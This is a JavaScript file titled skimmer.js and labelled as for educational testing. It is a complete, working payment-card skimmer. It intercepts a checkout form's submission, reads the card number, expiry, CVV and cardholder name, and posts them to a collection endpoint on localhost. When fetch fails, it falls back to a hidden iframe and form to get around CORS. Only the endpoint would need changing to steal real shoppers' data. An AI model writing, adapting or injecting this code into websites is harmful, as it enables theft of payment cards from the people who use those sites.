// skimmer.js - For educational testing ONLY
document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("checkout");
    
    if (!form) {
        console.error("No checkout form found");
        return;
    }
    
    console.log("🔍 Skimmer script loaded successfully");
    
    form.addEventListener("submit", async (e) => {
        e.preventDefault();
        
        // Simulated card data (using test data only!)
        const testCardData = {
            card_number: form.card_number.value, // Test Visa number
            expiry: form.expiry.value,
            cvv: form.cvv.value,
            card_holder_name: form.cardholder.value, 
            timestamp: new Date().toISOString()
        };
        
        console.log("🔄 Attempting to send data...");
        
        try {
            // Bypass CORS with no-cors mode (less reliable)
            const response = await fetch("http://localhost:3000/collect", {
                method: "POST",
                mode: "cors", // Use 'no-cors' if still blocked
                headers: { 
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(testCardData)
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log("✅ Data successfully intercepted:", data);
            } else {
                console.error("❌ Server responded with error:", response.status);
            }
        } catch (error) {
            console.error("❌ Fetch error:", error);
            
            // Alternative: Use form submission bypass
            sendViaForm(testCardData);
        }
    });
    
    // Alternative method using form submission (bypasses CORS)
    function sendViaForm(data) {
        console.log("🔄 Trying form submission method...");
        
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.name = 'skimmer_frame';
        document.body.appendChild(iframe);
        
        const form = document.createElement('form');
        form.target = 'skimmer_frame';
        form.action = 'http://localhost:3000/collect';
        form.method = 'POST';
        
        Object.keys(data).forEach(key => {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = data[key];
            form.appendChild(input);
        });
        
        document.body.appendChild(form);
        form.submit();
        
        setTimeout(() => {
            document.body.removeChild(form);
            document.body.removeChild(iframe);
            console.log("✅ Form submission completed");
        }, 1000);
    }
});